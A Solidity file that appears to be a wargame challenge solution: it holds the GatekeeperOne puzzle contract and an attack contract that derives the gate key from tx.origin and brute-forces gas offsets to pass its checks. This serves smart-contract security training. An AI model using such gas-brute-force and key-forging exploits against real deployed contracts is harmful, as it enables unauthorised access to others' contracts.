// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "Invalid caller");
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0, "Invalid gas");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
    public
    gateOne
    gateTwo
    gateThree(_gateKey)
    returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract AtGatekeeper {
    GatekeeperOne gpone;
    bytes8 public _gateKey;

    constructor(GatekeeperOne _one) {
        gpone = _one;
    }

    event gaswant(uint256);

    function attack() public returns (bool success) {
        _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFF0000FF0000FFFF;
        for (uint256 i = 0; i < 600; i++) {
            (success, ) = address(gpone).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                emit gaswant(i);
                break;
            }
        }
    }
}
